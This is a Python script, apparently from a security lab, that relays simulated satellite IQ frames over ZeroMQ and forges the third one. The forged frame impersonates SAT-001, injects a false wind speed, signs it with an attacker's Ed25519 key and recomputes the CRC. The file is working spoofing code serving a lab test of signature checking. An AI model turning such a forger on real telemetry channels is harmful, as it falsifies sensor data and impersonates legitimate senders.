import json
import struct
import zlib

import numpy as np
import zmq

from cryptography.hazmat.primitives.asymmetric.ed25519 import (
    Ed25519PrivateKey
)


# ==========================================
# CONFIGURATION
# ==========================================

SOURCE = "tcp://10.10.1.1:5555"
DESTINATION = "tcp://10.10.2.10:5556"

PREAMBLE = b"\x1a\xcf\xfc\x1d"
SAMPLES_PER_SYMBOL = 4

EXPECTED_BLOCKS = 5
TARGET_BLOCK = 3

FALSE_WIND_SPEED = 99.9


# ==========================================
# DEMODULATION BPSK
# ==========================================

def demodulate(iq_bytes):

    if len(iq_bytes) == 0 or len(iq_bytes) % 8 != 0:
        raise ValueError("IQ_LENGTH_INVALID")

    iq = np.frombuffer(
        iq_bytes,
        dtype=np.complex64
    )

    if iq.size % SAMPLES_PER_SYMBOL != 0:
        raise ValueError("IQ_ALIGNMENT_INVALID")

    symbols = iq.reshape(
        -1, SAMPLES_PER_SYMBOL
    ).real.mean(axis=1)

    bits = (symbols < 0).astype(np.uint8)

    return np.packbits(bits).tobytes()


# ==========================================
# LECTURE DE L'OBSERVATION
# ==========================================

def read_observation(iq_bytes):

    frame = demodulate(iq_bytes)

    if len(frame) < 4 + 2 + 64 + 4:
        raise ValueError("FRAME_TOO_SHORT")

    if frame[:4] != PREAMBLE:
        raise ValueError("PREAMBLE_INVALID")

    payload_size = struct.unpack(
        "!H", frame[4:6]
    )[0]

    expected_size = (
        4 + 2 + payload_size + 64 + 4
    )

    if (
        not 0 < payload_size <= 4096
        or len(frame) != expected_size
    ):
        raise ValueError("FRAME_LENGTH_INVALID")

    # Vérifier le CRC32 de la trame originale
    received_crc = struct.unpack(
        "!I", frame[-4:]
    )[0]

    calculated_crc = (
        zlib.crc32(frame[4:-4]) & 0xFFFFFFFF
    )

    if received_crc != calculated_crc:
        raise ValueError("ORIGINAL_CRC_INVALID")

    payload_bytes = frame[
        6:6 + payload_size
    ]

    observation = json.loads(
        payload_bytes.decode("utf-8")
    )

    if not isinstance(observation, dict):
        raise ValueError("OBSERVATION_INVALID")

    return observation


# ==========================================
# FABRICATION D'UNE FAUSSE TRAME
# ==========================================

def forge_iq(original, attacker_key):

    forged = dict(original)

    old_speed = forged.get("wind_speed_ms")

    # Usurper l'identité légitime
    forged["satellite_id"] = "SAT-001"

    # Injecter une fausse mesure
    forged["wind_speed_ms"] = FALSE_WIND_SPEED

    # Construire le JSON canonique
    payload = json.dumps(
        forged,
        sort_keys=True,
        separators=(",", ":"),
        ensure_ascii=False,
        allow_nan=False
    ).encode("utf-8")

    # Signer avec la clé de l'attaquant
    signature = attacker_key.sign(payload)

    # Construire le corps de la trame
    body = (
        struct.pack("!H", len(payload))
        + payload
        + signature
    )

    # Recalculer le CRC32
    crc = zlib.crc32(body) & 0xFFFFFFFF

    frame = (
        PREAMBLE
        + body
        + struct.pack("!I", crc)
    )

    # Modulation BPSK
    bits = np.unpackbits(
        np.frombuffer(frame, dtype=np.uint8)
    )

    symbols = (
        1.0 - 2.0 * bits.astype(np.float32)
    )

    iq = np.repeat(
        symbols,
        SAMPLES_PER_SYMBOL
    ).astype(np.complex64)

    return iq.tobytes(), old_speed, payload, signature


# ==========================================
# CANAL D'ATTAQUE SPOOFING
# ==========================================

def main():

    # Une clé privée différente de celle de Satellite
    attacker_key = Ed25519PrivateKey.generate()

    print(
        "[SPOOF] Clé Ed25519 de l'attaquant générée"
    )
    print(
        "[SPOOF] Aucune clé privée légitime sur VM3"
    )

    context = zmq.Context()

    receiver = context.socket(zmq.PULL)
    sender = context.socket(zmq.PUSH)

    receiver.setsockopt(zmq.LINGER, 0)

    sender.setsockopt(zmq.LINGER, 1000)
    sender.setsockopt(zmq.IMMEDIATE, 1)
    sender.setsockopt(zmq.SNDTIMEO, 5000)

    received = 0
    forwarded = 0
    spoofed = 0

    try:

        receiver.bind(SOURCE)
        sender.connect(DESTINATION)

        print(
            f"[CANAL] SPOOFING | "
            f"{SOURCE} -> {DESTINATION}"
        )
        print(
            "[CANAL] Trame 3 remplacée par "
            "une fausse observation signée"
        )

        while received < EXPECTED_BLOCKS:

            incoming_iq = receiver.recv()

            received += 1

            original = read_observation(
                incoming_iq
            )

            seq = original.get(
                "sequence_number"
            )

            if received == TARGET_BLOCK:

                if seq != TARGET_BLOCK:
                    raise ValueError(
                        "UNEXPECTED_SEQUENCE_FOR_SPOOF"
                    )

                (
                    outgoing_iq,
                    previous_wind,
                    payload,
                    signature
                ) = forge_iq(
                    original,
                    attacker_key
                )

                # Vérifier la signature avec
                # la clé publique de l'attaquant
                attacker_key.public_key().verify(
                    signature,
                    payload
                )

                spoofed += 1

                print(
                    f"[SPOOF] seq={seq} | "
                    "identité=SAT-001 | "
                    f"wind={previous_wind} -> "
                    f"{FALSE_WIND_SPEED} m/s"
                )

                print(
                    "[SPOOF] Signature créée avec "
                    "la clé de l'attaquant"
                )
                print(
                    "[SPOOF] CRC32 recalculé"
                )

                status = "SPOOFED"

            else:

                outgoing_iq = incoming_iq
                status = "INTACT"

            sender.send(outgoing_iq)

            forwarded += 1

            print(
                f"[TX] bloc={received} | "
                f"seq={seq} | "
                f"{status} | "
                f"{len(outgoing_iq)} octets"
            )

    except KeyboardInterrupt:

        print("\n[CANAL] Arrêt manuel")

    finally:

        receiver.close()
        sender.close()
        context.term()

        print(
            f"[BILAN] reçus={received} | "
            f"relayés_ZeroMQ={forwarded} | "
            f"spoofed={spoofed}"
        )


if __name__ == "__main__":
    main()
